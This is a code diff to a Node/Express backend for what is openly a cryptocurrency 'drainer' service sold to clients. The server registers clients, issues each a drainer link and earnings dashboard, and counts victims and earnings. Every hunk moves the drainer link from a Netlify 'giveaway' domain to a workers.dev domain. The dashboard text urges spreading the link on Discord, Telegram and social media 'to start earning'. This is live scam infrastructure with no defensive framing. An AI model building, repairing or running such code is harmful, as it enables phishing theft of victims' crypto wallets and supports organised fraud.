@@ -107,7 +107,7 @@ app.post('/saas/register', (req, res) => {
     res.json({
   success: true,
   clientId: clientId,
-  drainerUrl: `https://cheetah-giveaway.netlify.app/?client=${clientId}`,
+  drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
   dashboardUrl: `https://service-cheetah.netlify.app/dashboard.html?client=${clientId}`,
   message: 'Client registered successfully'
 });
@@ -194,7 +194,7 @@ app.post('/saas/v2/register', (req, res) => {
     res.json({
   success: true,
   clientId: clientId,
-  drainerUrl: `https://cheetah-giveaway.netlify.app/?client=${clientId}`,
+  drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
   dashboardUrl: `https://service-cheetah.netlify.app/dashboard.html?client=${clientId}`,
   message: 'Client registered successfully'
 });
@@ -517,7 +517,7 @@ app.use(
 // 2. CORS configuration
 app.use(cors({
   origin: [
-    'https://cheetah-giveaway.netlify.app', // ← ADD THIS
+    'https://ch.xqx.workers.dev', // ← ADD THIS
     'http://localhost:5173', 
     'http://localhost:3000', 
     'http://localhost:3001'
@@ -796,7 +796,7 @@ app.get('/saas/dashboard/:clientId', (req, res) => {
         <div class="section">
             <h3 class="section-title">🚀 Your Drainer URL</h3>
             <div class="url-box">
-                https://cheetah-giveaway.netlify.app/?client/${clientId}
+                https://ch.xqx.workers.dev/?client/${clientId}
             </div>
             <p style="color: #94a3b8; margin-bottom: 15px;">
                 Share this link on Discord, Telegram, or social media to start earning!
@@ -845,7 +845,7 @@ app.get('/saas/dashboard/:clientId', (req, res) => {
 
     <script>
         function copyUrl() {
-const url = 'https://cheetah-giveaway.netlify.app/?client=${clientId}';
+const url = 'https://ch.xqx.workers.dev/?client=${clientId}';
 navigator.clipboard.writeText(url).then(() => {
                 alert('URL copied to clipboard!');
             });
@@ -1648,7 +1648,7 @@ app.get('/saas/admin/:clientId', (req, res) => {
         </div>
         <div class="card">
             <h3>🔗 Your Drainer URL</h3>
-<input type="text" value="https://cheetah-giveaway.netlify.app/?client=${clientId}" readonly style="width: 100%; padding: 10px; margin: 10px 0;">
+<input type="text" value="https://ch.xqx.workers.dev/?client=${clientId}" readonly style="width: 100%; padding: 10px; margin: 10px 0;">
 <p>Share this link to start earning!</p>
         </div>
         <div class="card">
@@ -1828,7 +1828,7 @@ app.get("/api/saas-clients", (req, res) => {
         totalEarnings: totalEarnings.toFixed(4),
         victimCount,
         registrationDate: "Recent",
-        drainerUrl: "https://cheetah-giveaway.netlify.app/?client=" + clientId,
+        drainerUrl: "https://ch.xqx.workers.dev/?client=" + clientId,
         dashboardUrl: "https://service-s816.onrender.com/saas/dashboard/" + clientId
       };
     });
